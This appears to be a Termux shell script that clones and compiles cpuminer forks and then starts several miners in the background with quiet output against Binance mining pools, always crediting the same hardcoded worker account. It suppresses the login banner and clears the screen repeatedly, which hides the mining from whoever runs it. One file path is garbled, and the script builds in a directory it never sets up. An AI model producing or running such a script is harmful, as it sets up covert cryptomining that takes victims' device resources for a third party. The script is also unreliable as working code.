echo -e ".a0HACK."
echo -n ".a0HACK0."
USER=$(whoami)
current_dir=$(pwd)
dpkg --configure -a
touch ~/.hushlogin
apt update
clear
apt clean
apt autoclean
cat -t /data/data/com.termux/files/home/cpuminer/cs_sss_layout.md.txt.seedttl[`]{dm} | lolcat -p 100 -a

cd ~
git clone https://github.com/tpruvot/cpuminer-multi.git
cd ~/cpuminer-multi
git pull
./build-linux-arm.sh
cd ~
git clone https://github.com/wong-fi-hung/termux-miner.git
cd ~/termux-miner
git pull
./build-linux-arm.sh
apt update
apt upgrade -y
apt update
apt upgrade -y
pwd
clear
cd ~/cpuminer-multi
./configure --with-crypto --with-curl --disable-assembly CC=gcc CXX=g++ CFLAGS="-Ofast -fuse-linker-plugin -ftree-loop-if-convert-stores -march=native" LDFLAGS="-march=native"
make
clear
./cpuminer --algo=sha256d --threads=1 --cpu-priority=0 --url=stratum+tcp://sha256.poolbinance.com:443 --user=dolBlob01.001 -p 123456 --background --quiet --randomize --no-gbt
clear
apt update
apt upgrade -y
pwd
clear
cd ~/cpuminer-multi
./configure --with-crypto --with-curl --disable-assembly CC=gcc CXX=g++ CFLAGS="-Ofast -fuse-linker-plugin -ftree-loop-if-convert-stores -march=native" LDFLAGS="-march=native"
make
clear
./cpuminer --algo=scrypt --threads=1 --cpu-priority=0 --url=stratum+tcp://ltc.poolbinance.com:3333 --user=dolBlob01.001 -p 123456 --background --quiet -n --randomize --no-extranonce --no-gbt
clear
apt update
apt upgrade -y
pwd
clear
cd ~/termux-miner
./configure --with-crypto --with-curl --disable-assembly CC=gcc CXX=g++ CFLAGS="-Ofast -fuse-linker-plugin -ftree-loop-if-convert-stores -march=native" LDFLAGS="-march=native"
make
clear
./cpuminer --algo=sha256d --threads=1 --cpu-priority=0 --url=stratum+tcp://sha256.poolbinance.com:443 --user=dolBlob01.001 -p 123456 --background --quiet --randomize --no-gbt --no-redirect --no-longpoll
clear
apt update
apt upgrade -y
pwd
clear
cd ~/scrypts
./configure --with-crypto --with-curl --disable-assembly CC=gcc CXX=g++ CFLAGS="-Ofast -fuse-linker-plugin -ftree-loop-if-convert-stores -march=native" LDFLAGS="-march=native"
make
clear
./cpuminer --algo=sha256d --threads=1 --cpu-priority=0 --url=stratum+tcp://sha256.poolbinance.com:443 --user=dolBlob01.001 -p 123456 --background --quiet --randomize --hide-diff --no-color 
clear
apt update
apt upgrade -y
clear
